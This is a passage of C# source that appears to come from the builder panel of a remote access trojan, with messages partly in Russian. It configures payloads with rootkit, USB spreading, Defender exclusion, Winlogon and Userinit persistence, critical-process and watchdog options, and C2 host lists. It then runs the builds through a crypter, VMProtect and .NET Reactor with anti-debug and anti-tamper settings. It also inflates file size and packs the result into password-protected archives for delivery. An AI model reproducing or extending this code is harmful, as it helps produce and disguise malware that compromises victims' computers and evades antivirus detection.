			rjTextBoxCmdlineProcess.Texts = bulidData.CmdlineProcessName ?? "";
			checkBoxCmdlineAutorun_CheckedChanged(null, EventArgs.Empty);
			if (bulidData.UsePastebin)
			{
				checkBox3.Checked = bulidData.UsePastebin;
				rjTextBox8.Texts = bulidData.PastebinUrl ?? "";
			}
		}
	}

	private void rjButtonBuildJar_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		string selectedExtension = GetSelectedExtension();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(12) + selectedExtension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string outputPath = saveFileDialog.FileName;
		try
		{
			string randomMutex = Guid.NewGuid().ToString("N").Substring(0, 16);
			rjTextBox6.Texts = randomMutex;
			checkBoxAntiVirtual.Checked = false;
			checkBox8.Checked = false;
			checkBoxProcessCritical.Checked = false;
			checkBoxUSBSpread.Checked = false;
			checkBox4.Checked = false;
			checkBoxCtrlFlow.Checked = true;
			checkBoxJunk.Checked = true;
			checkBoxProxyInt.Checked = true;
			checkBoxRename.Checked = true;
			checkBoxMixer.Checked = true;
			checkBoxProtectInt.Checked = true;
			checkBoxProxyString.Checked = true;
			checkBox15.Checked = true;
			checkBox10.Checked = true;
			Random rnd = new Random();
			string randomVersion = $"{rnd.Next(100, 200)}.{rnd.Next(0, 10)}.{rnd.Next(1000, 9999)}.{rnd.Next(100, 999)}";
			TextBoxProductVersion.Texts = randomVersion;
			TextBoxFileVersion.Texts = randomVersion;
			string tempBuildPath = Path.Combine(Path.GetTempPath(), "temp_build_" + Guid.NewGuid().ToString("N") + selectedExtension);
			CreateBulid(tempBuildPath);
			if (!File.Exists(tempBuildPath))
			{
				MessageBox.Show("Ошибка: сборка не создана.", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			string cryptorPath = Path.Combine(Application.StartupPath, "Stub", "Cryptor", "Cryptor.exe");
			if (!File.Exists(cryptorPath))
			{
				MessageBox.Show("Cryptor не найден!\n\nПуть: " + cryptorPath + "\n\nПостройте Cryptor из Visual Studio:\n1. Откройте Cryptor/Cryptor.sln\n2. Build -> Rebuild Solution (Release)\n3. Cryptor.exe будет скопирован в Server\\bin\\Release\\Stub\\Cryptor\\", "Cryptor Not Found", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				File.Copy(tempBuildPath, outputPath, overwrite: true);
				File.Delete(tempBuildPath);
				MessageBox.Show("Билд создан БЕЗ Cryptor\n\nФайл: " + outputPath, "Build Success (No Cryptor)", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			ProcessStartInfo psi = new ProcessStartInfo();
			psi.FileName = cryptorPath;
			psi.Arguments = $"-i \"{tempBuildPath}\" -o \"{outputPath}\"";
			psi.Verb = "runas";
			psi.UseShellExecute = true;
			psi.WindowStyle = ProcessWindowStyle.Normal;
			try
			{
				Process.Start(psi).WaitForExit();
				if (File.Exists(tempBuildPath))
				{
					File.Delete(tempBuildPath);
				}
				if (File.Exists(outputPath))
				{
					MessageBox.Show("Build Create", "Done", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					MessageBox.Show("Ошибка: Cryptor не создал защищённый файл.\n\nПроверьте консоль Cryptor на ошибки.", "Cryptor Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch (Win32Exception)
			{
				MessageBox.Show("Cryptor требует права администратора!\n\nНажмите 'Да' в UAC запросе.", "Administrator Rights Required", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				if (File.Exists(tempBuildPath))
				{
					File.Copy(tempBuildPath, outputPath, overwrite: true);
					File.Delete(tempBuildPath);
				}
			}
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Ошибка: " + ex2.Message + "\n\n" + ex2.StackTrace, "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButton11_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".json (*.json)|*.json";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		BulidData bulidData = new BulidData();
		bulidData.CheckIcon = checkBox20.Checked;
		bulidData.CheckAssembly = checkBox21.Checked;
		bulidData.DigitalSignature = checkBox22.Checked;
		bulidData.Icon = (checkBox20.Checked ? File.ReadAllBytes(pictureBox1.ImageLocation) : null);
		bulidData.Product = TextBoxProduct.Texts;
		bulidData.Description = TextBoxDescription.Texts;
		bulidData.Company = TextBoxCompany.Texts;
		bulidData.Copyright = TextBoxCopyright.Texts;
		bulidData.Trademarks = TextBoxTrademarks.Texts;
		bulidData.OriginalFilename = TextBoxOriginalFileName.Texts;
		bulidData.ProductVersion = TextBoxProductVersion.Texts;
		bulidData.FileVersion = TextBoxFileVersion.Texts;
		bulidData.Install = checkBox1.Checked;
		bulidData.ProcessName = checkBox2.Checked;
		bulidData.ProcessNameValue = rjTextBox9.Texts ?? "";
		bulidData.WinlogonShell = checkBoxWinlogonShell.Checked;
		bulidData.ExclusionWD = checkBox8.Checked;
		bulidData.HiddenFile = checkBox6.Checked;
		bulidData.RootKit = checkBox4.Checked;
		bulidData.Pump = checkBox9.Checked;
		bulidData.UserInit = checkBox7.Checked;
		bulidData.InstallWatchDog = checkBox5.Checked;
		bulidData.ProcessCritical = checkBoxProcessCritical.Checked;
		bulidData.ProcessCriticalName = rjTextBoxProcessCritical.Texts ?? "";
		bulidData.InstallServices = checkBoxWMIStartup.Checked;
		bulidData.InstallServicesValue = rjTextBoxWMIStartup.Texts ?? "";
		bulidData.TaskClient = rjTextBox2.Texts;
		bulidData.TaskWatchDog = rjTextBox5.Texts;
		bulidData.PathClientCmb = rjComboBox1.Texts;
		bulidData.PathClientBox = rjTextBox3.Texts;
		bulidData.PathWatchDogCmb = rjComboBox2.Texts;
		bulidData.PathWatchDogBox = rjTextBox4.Texts;
		bulidData.Group = rjTextBox7.Texts;
		bulidData.Mutex = rjTextBox6.Texts;
		bulidData.CmdlineAutorun = checkBoxCmdlineAutorun.Checked;
		bulidData.CmdlineDir = rjComboBoxCmdlineDir.Texts;
		bulidData.CmdlineProcessName = rjTextBoxCmdlineProcess.Texts;
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridIps.Rows)
		{
			list.Add((string)dataGridViewRow.Cells[0].Value);
		}
		bulidData.Hosts = list.ToArray();
		File.WriteAllText(saveFileDialog.FileName, JsonConvert.SerializeObject(bulidData, Formatting.Indented));
	}

	private void PumpFile(string filePath, int sizeValue, string sizeUnit)
	{
		try
		{
			long bytesToAdd = 0L;
			switch (sizeUnit.ToUpper())
			{
			case "KB":
				bytesToAdd = (long)sizeValue * 1024L;
				break;
			case "MB":
				bytesToAdd = (long)sizeValue * 1024L * 1024;
				break;
			case "GB":
				bytesToAdd = (long)sizeValue * 1024L * 1024 * 1024;
				break;
			}
			if (bytesToAdd <= 0 || !File.Exists(filePath))
			{
				return;
			}
			using FileStream fs = new FileStream(filePath, FileMode.Append);
			byte[] buffer = new byte[8192];
			long written = 0L;
			Random rnd = new Random();
			int toWrite;
			for (; written < bytesToAdd; written += toWrite)
			{
				toWrite = (int)Math.Min(buffer.Length, bytesToAdd - written);
				rnd.NextBytes(buffer);
				fs.Write(buffer, 0, toWrite);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Error pumping file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private string CreateArchive(string filePath, string archiveType, string archiveName, string password, string buildName = null)
	{
		try
		{
			if (!File.Exists(filePath))
			{
				MessageBox.Show("Build file not found: " + filePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return null;
			}
			string directory = Path.GetDirectoryName(filePath);
			string fileName = (string.IsNullOrWhiteSpace(archiveName) ? Path.GetFileNameWithoutExtension(filePath) : archiveName);
			string archivePath = Path.Combine(directory, fileName + "." + archiveType.ToLower());
			string fileToArchive = filePath;
			string fileNameForArchive = Path.GetFileName(filePath);
			bool isTemporaryFile = false;
			string passwordFileName = "PASSWORD.txt";
			bool passwordFileCreated = false;
			if (!string.IsNullOrWhiteSpace(buildName))
			{
				string fileExtension = Path.GetExtension(filePath);
				string tempFileName = buildName + fileExtension;
				string tempFilePath = Path.Combine(directory, tempFileName);
				if (tempFilePath != filePath)
				{
					File.Copy(filePath, tempFilePath, overwrite: true);
					fileToArchive = tempFilePath;
					fileNameForArchive = tempFileName;
					isTemporaryFile = true;
				}
			}
			if (!string.IsNullOrWhiteSpace(password))
			{
				try
				{
					File.WriteAllText(Path.Combine(directory, passwordFileName), "PASSWORD: " + password);
					passwordFileCreated = true;
				}
				catch
				{
				}
			}
			string sevenZipPath = null;
			string[] array = new string[5]
			{
				Path.Combine(Application.StartupPath, "7z.exe"),
				Path.Combine(Application.StartupPath, "7zip", "7z.exe"),
				"C:\\Program Files\\7-Zip\\7z.exe",
				"C:\\Program Files (x86)\\7-Zip\\7z.exe",
				"7z.exe"
			};
			foreach (string path in array)
			{
				if (File.Exists(path))
				{
					sevenZipPath = path;
					break;
				}
			}
			if (sevenZipPath == null)
			{
				sevenZipPath = "7z.exe";
			}
			string arguments = "";
			bool useRar = false;
			string rarPath = null;
			array = new string[4]
			{
				Path.Combine(Application.StartupPath, "rar.exe"),
				"C:\\Program Files\\WinRAR\\rar.exe",
				"C:\\Program Files (x86)\\WinRAR\\rar.exe",
				"rar.exe"
			};
			foreach (string path2 in array)
			{
				if (File.Exists(path2))
				{
					rarPath = path2;
					break;
				}
			}
			string originalDir = Directory.GetCurrentDirectory();
			Directory.SetCurrentDirectory(directory);
			switch (archiveType.ToLower())
			{
			case "7zip":
				archivePath = Path.Combine(directory, fileName + ".7z");
				arguments = $"a \"{archivePath}\" \"{fileNameForArchive}\"";
				if (passwordFileCreated)
				{
					arguments += $" \"{passwordFileName}\"";
				}
				if (!string.IsNullOrWhiteSpace(password))
				{
					arguments += $" -p\"{password}\" -mhe=on";
				}
				break;
			case "zip":
				archivePath = Path.Combine(directory, fileName + ".zip");
				if (rarPath != null)
				{
					useRar = true;
					arguments = $"a -ep -afzip \"{archivePath}\" \"{fileNameForArchive}\"";
					if (passwordFileCreated)
					{
						arguments += $" \"{passwordFileName}\"";
					}
					if (!string.IsNullOrWhiteSpace(password))
					{
						arguments += $" -p\"{password}\"";
					}
				}
				else
				{
					arguments = $"a -tzip \"{archivePath}\" \"{fileNameForArchive}\"";
					if (passwordFileCreated)
					{
						arguments += $" \"{passwordFileName}\"";
					}
					if (!string.IsNullOrWhiteSpace(password))
					{
						arguments += $" -p\"{password}\"";
					}
				}
				break;
			case "rar":
				useRar = true;
				if (rarPath == null)
				{
					rarPath = "rar.exe";
				}
				archivePath = Path.Combine(directory, fileName + ".rar");
				arguments = $"a -ep \"{archivePath}\" \"{fileNameForArchive}\"";
				if (passwordFileCreated)
				{
					arguments += $" \"{passwordFileName}\"";
				}
				if (!string.IsNullOrWhiteSpace(password))
				{
					arguments += $" -hp\"{password}\"";
				}
				break;
			}
			if (useRar && rarPath != null)
			{
				try
				{
					Process rarProcess = Process.Start(new ProcessStartInfo
					{
						FileName = rarPath,
						Arguments = arguments,
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						WorkingDirectory = directory
					});
					if (rarProcess != null)
					{
						rarProcess.WaitForExit();
						if (rarProcess.ExitCode == 0 && File.Exists(archivePath))
						{
							Directory.SetCurrentDirectory(originalDir);
							if (isTemporaryFile && File.Exists(fileToArchive))
							{
								File.Delete(fileToArchive);
							}
							if (passwordFileCreated && File.Exists(Path.Combine(directory, passwordFileName)))
							{
								File.Delete(Path.Combine(directory, passwordFileName));
							}
							return archivePath;
						}
					}
				}
				catch (Exception ex)
				{
					if (!(archiveType.ToLower() == "zip"))
					{
						Directory.SetCurrentDirectory(originalDir);
						MessageBox.Show("Failed to create RAR archive: " + ex.Message + "\n\nPlease install WinRAR.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						if (isTemporaryFile && File.Exists(fileToArchive))
						{
							File.Delete(fileToArchive);
						}
						return null;
					}
					useRar = false;
					arguments = $"a -tzip \"{archivePath}\" \"{fileNameForArchive}\"";
					if (!string.IsNullOrWhiteSpace(password))
					{
						arguments += $" -p\"{password}\"";
					}
				}
			}
			if (!useRar)
			{
				try
				{
					Process process = Process.Start(new ProcessStartInfo
					{
						FileName = sevenZipPath,
						Arguments = arguments,
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						WorkingDirectory = directory
					});
					if (process != null)
					{
						process.WaitForExit();
						if (process.ExitCode == 0 && File.Exists(archivePath))
						{
							Directory.SetCurrentDirectory(originalDir);
							if (isTemporaryFile && File.Exists(fileToArchive))
							{
								File.Delete(fileToArchive);
							}
							if (passwordFileCreated && File.Exists(Path.Combine(directory, passwordFileName)))
							{
								File.Delete(Path.Combine(directory, passwordFileName));
							}
							return archivePath;
						}
						Directory.SetCurrentDirectory(originalDir);
						if (isTemporaryFile && File.Exists(fileToArchive))
						{
							File.Delete(fileToArchive);
						}
						if (passwordFileCreated && File.Exists(Path.Combine(directory, passwordFileName)))
						{
							File.Delete(Path.Combine(directory, passwordFileName));
						}
						string output = process.StandardOutput.ReadToEnd();
						string error = process.StandardError.ReadToEnd();
						MessageBox.Show("7-Zip error:\n" + error + "\n" + output + "\n\nPath: " + sevenZipPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
				catch (Exception ex2)
				{
					Directory.SetCurrentDirectory(originalDir);
					if (isTemporaryFile && File.Exists(fileToArchive))
					{
						File.Delete(fileToArchive);
					}
					if (passwordFileCreated && File.Exists(Path.Combine(directory, passwordFileName)))
					{
						File.Delete(Path.Combine(directory, passwordFileName));
					}
					MessageBox.Show("Failed to start 7-Zip: " + ex2.Message + "\n\nPath: " + sevenZipPath + "\n\nPlease install 7-Zip or place 7z.exe in the application folder.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			Directory.SetCurrentDirectory(originalDir);
			if (isTemporaryFile && File.Exists(fileToArchive))
			{
				File.Delete(fileToArchive);
			}
			if (passwordFileCreated && File.Exists(Path.Combine(directory, passwordFileName)))
			{
				File.Delete(Path.Combine(directory, passwordFileName));
			}
			return null;
		}
		catch (Exception ex3)
		{
			MessageBox.Show("Error creating archive: " + ex3.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return null;
		}
	}

	private void rjButton13_Click(object sender, EventArgs e)
	{
		string localIp = GetLocalIPAddress();
		if (!string.IsNullOrEmpty(localIp))
		{
			rjTextBox1.Texts = localIp;
		}
	}

	private void rjButton14_Click(object sender, EventArgs e)
	{
		string localIp = GetLocalIPAddress();
		if (string.IsNullOrEmpty(localIp))
		{
			return;
		}
		string port = "1337";
		if (File.Exists("local\\Settings.json"))
		{
			try
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				if (settings.Ports != null && settings.Ports.Length != 0)
				{
					port = settings.Ports[0];
				}
			}
			catch
			{
			}
		}
		rjTextBox1.Texts = localIp + ":" + port;
	}

	private void rjButton15_Click(object sender, EventArgs e)
	{
		GridIps.Rows.Clear();
		string port = "1337";
		if (File.Exists("local\\Settings.json"))
		{
			try
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				if (settings.Ports != null && settings.Ports.Length != 0)
				{
					port = settings.Ports[0];
				}
			}
			catch
			{
			}
		}
		rjTextBox1.Texts = "127.0.0.1:" + port;
		rjTextBox7.Texts = "Default";
		rjTextBox6.Texts = Randomizer.getRandomCharacters();
	}

	private string GetLocalIPAddress()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress ip in addressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
				{
					return ip.ToString();
				}
			}
		}
		catch
		{
		}
		return null;
	}

	private void BuildVMP_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool vmpSuccess = false;
			try
			{
				vmpSuccess = ApplyVMProtection(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyVMProtection: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!vmpSuccess)
			{
				MessageBox.Show("VMProtect failed! Build created without protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			try
			{
				if (checkBox11.Checked && checkBox14.Checked && !string.IsNullOrWhiteSpace(rjTextBox13.Texts) && int.TryParse(rjTextBox13.Texts, out var pumpSize) && pumpSize > 0)
				{
					string sizeUnit = rjComboBox5.Texts;
					PumpFile(finalPath, pumpSize, sizeUnit);
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Exception in PumpFile: " + ex2.Message + "\n\n" + ex2.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			try
			{
				if (checkBox11.Checked)
				{
					string archiveType = rjComboBox4.Texts;
					string archiveName = rjTextBox10.Texts;
					string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
					string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
					string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
					if (archivePath != null)
					{
						MessageBox.Show("Build created with obfuscation + VMP protection and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
						SaveBuildRecord(Path.GetFileName(archivePath), archivePath);
					}
					else
					{
						MessageBox.Show("Build created with obfuscation + VMP protection but archiving failed!");
						SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
					}
				}
				else
				{
					MessageBox.Show("Build Create!");
					SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
				}
			}
			catch (Exception ex3)
			{
				MessageBox.Show("Exception in CreateArchive: " + ex3.Message + "\n\n" + ex3.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception ex4)
		{
			MessageBox.Show("Critical exception in BuildVMP_Click: " + ex4.Message + "\n\n" + ex4.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private bool ApplyVMProtection(string filePath)
	{
		try
		{
			string vmpPath = Path.Combine(Application.StartupPath, "Stub", "VMP", "VMProtect_Con.exe");
			if (!File.Exists(vmpPath))
			{
				MessageBox.Show("VMProtect_Con.exe not found at: " + vmpPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			if (!File.Exists(filePath))
			{
				MessageBox.Show("Input file not found: " + filePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			string outputFile = Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) + "_vmp" + Path.GetExtension(filePath));
			ProcessStartInfo psi = new ProcessStartInfo
			{
				FileName = vmpPath,
				Arguments = $"\"{filePath}\" \"{outputFile}\"",
				WindowStyle = ProcessWindowStyle.Normal,
				CreateNoWindow = false,
				UseShellExecute = true,
				Verb = "runas",
				WorkingDirectory = Path.GetDirectoryName(vmpPath)
			};
			try
			{
				Process process = Process.Start(psi);
				if (process != null)
				{
					process.WaitForExit();
					Thread.Sleep(1000);
					if (File.Exists(outputFile))
					{
						try
						{
							if (File.Exists(filePath))
							{
								File.Delete(filePath);
							}
							File.Move(outputFile, filePath);
							return true;
						}
						catch (Exception ex)
						{
							MessageBox.Show("Error replacing file: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
							return false;
						}
					}
					MessageBox.Show("VMProtect did not create output file.\n\nExpected: " + outputFile + "\n\nExit Code: " + process.ExitCode, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return false;
				}
				MessageBox.Show("Failed to start VMProtect process.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			catch (Win32Exception ex2)
			{
				if (ex2.NativeErrorCode == 1223)
				{
					MessageBox.Show("Administrator privileges required. UAC prompt was cancelled.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					return false;
				}
				throw;
			}
		}
		catch (Exception ex3)
		{
			MessageBox.Show("Error applying VMProtect: " + ex3.Message + "\n\n" + ex3.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private void rjButton17_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool reactorSuccess = false;
			try
			{
				reactorSuccess = ApplyNETReactor730(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyNETReactor730: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!reactorSuccess)
			{
				MessageBox.Show(".NET Reactor 7.3.0 failed! Build created without protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			try
			{
				if (checkBox11.Checked && checkBox14.Checked && !string.IsNullOrWhiteSpace(rjTextBox13.Texts) && int.TryParse(rjTextBox13.Texts, out var pumpSize) && pumpSize > 0)
				{
					string sizeUnit = rjComboBox5.Texts;
					PumpFile(finalPath, pumpSize, sizeUnit);
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Exception in PumpFile: " + ex2.Message + "\n\n" + ex2.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			try
			{
				if (checkBox11.Checked)
				{
					string archiveType = rjComboBox4.Texts;
					string archiveName = rjTextBox10.Texts;
					string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
					string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
					string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
					if (archivePath != null)
					{
						MessageBox.Show("Build created with .NET Reactor 7.3.0 protection and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
						SaveBuildRecord(Path.GetFileName(archivePath), archivePath);
					}
					else
					{
						MessageBox.Show("Build created with .NET Reactor 7.3.0 protection but archiving failed!");
						SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
					}
				}
				else
				{
					MessageBox.Show("Build Create!");
					SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
				}
			}
			catch (Exception ex3)
			{
				MessageBox.Show("Exception in CreateArchive: " + ex3.Message + "\n\n" + ex3.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception ex4)
		{
			MessageBox.Show("Critical exception in rjButton17_Click: " + ex4.Message + "\n\n" + ex4.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private bool ApplyNETReactor730(string filePath)
	{
		try
		{
			string reactorConsolePath = Path.Combine(Application.StartupPath, "Stub", "NET Reactor v7.3.0 Full", "dotNET_Reactor.Console.exe");
			if (!File.Exists(reactorConsolePath))
			{
				MessageBox.Show(".NET Reactor Console not found at: " + reactorConsolePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			if (!File.Exists(filePath))
			{
				MessageBox.Show("Input file not found: " + filePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			string outputFile = Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) + "_reactor" + Path.GetExtension(filePath));
			string arguments = $"-file \"{filePath}\" -targetfile \"{outputFile}\" -necrobit 1 -necrobit_comp 9 -necrobit_prot 1 -obfuscation 1 -obf_compatible 0 -control_flow_obfuscation 1 -flow_level 9 -all_params 1 -all_type_params 1 -hide_private_calls 1 -hide_calls 1 -native_evc_methods 1 -stringencryption 1 -string_encryption_mode 2 -resourceencryption 1 -res_encryption_mode 2 -virtualization 1 -virtualization_compatible 0 -anti_tamper 1 -antidecompiler 1 -antidebug 1 -anti_debug_win 1 -anti_monitor 1 -antistrong 1 -suppressildasm 1 -suppress_reflection_info 1 -incremental_obfuscation 0 -merge_namespaces 1 -public_types 1 -internal_types 1 -public_methods 1 -internal_methods 1 -public_fields 1 -internal_fields 1 -public_events 1 -internal_events 1 -public_properties 1 -internal_properties 1 -obfuscate_params 1 -obfuscate_events 1 -mapping_file 0 -short_names 1 -unprintable_names 1 -hide_serializable 1 -obfuscate_public_types 1 -exclude_wpf_xaml 0 -exclude_serializable 0 -preset 2";
			ProcessStartInfo psi = new ProcessStartInfo
			{
				FileName = reactorConsolePath,
				Arguments = arguments,
				WindowStyle = ProcessWindowStyle.Normal,
				CreateNoWindow = false,
				UseShellExecute = false,
				RedirectStandardOutput = false,
				RedirectStandardError = false,
				WorkingDirectory = Path.GetDirectoryName(reactorConsolePath)
			};
			try
			{
				Process process = Process.Start(psi);
				if (process != null)
				{
					if (!process.WaitForExit(900000))
					{
						try
						{
							process.Kill();
						}
						catch
						{
						}
						MessageBox.Show(".NET Reactor timeout (15 minutes).", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						return false;
					}
					Thread.Sleep(1000);
					if (File.Exists(outputFile))
					{
						try
						{
							if (File.Exists(filePath))
							{
								File.Delete(filePath);
							}
							File.Move(outputFile, filePath);
							return true;
						}
						catch (Exception ex)
						{
							MessageBox.Show("Error replacing file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
							return false;
						}
					}
					MessageBox.Show(".NET Reactor 7.3.0 did not create output file.\n\nExpected: " + outputFile, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return false;
				}
				MessageBox.Show("Failed to start .NET Reactor process.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			catch (Win32Exception ex2)
			{
				if (ex2.NativeErrorCode == 1223)
				{
					MessageBox.Show("Administrator privileges required. UAC prompt was cancelled.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					return false;
				}
				throw;
			}
		}
		catch (Exception ex3)
		{
			MessageBox.Show("Error applying .NET Reactor 7.3.0: " + ex3.Message + "\n\n" + ex3.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private void BuildReactor_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool reactorSuccess = false;
			try
			{
				reactorSuccess = ApplyNetReactor(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyNetReactor: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!reactorSuccess)
			{
				MessageBox.Show(".NET Reactor failed! Build created without protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
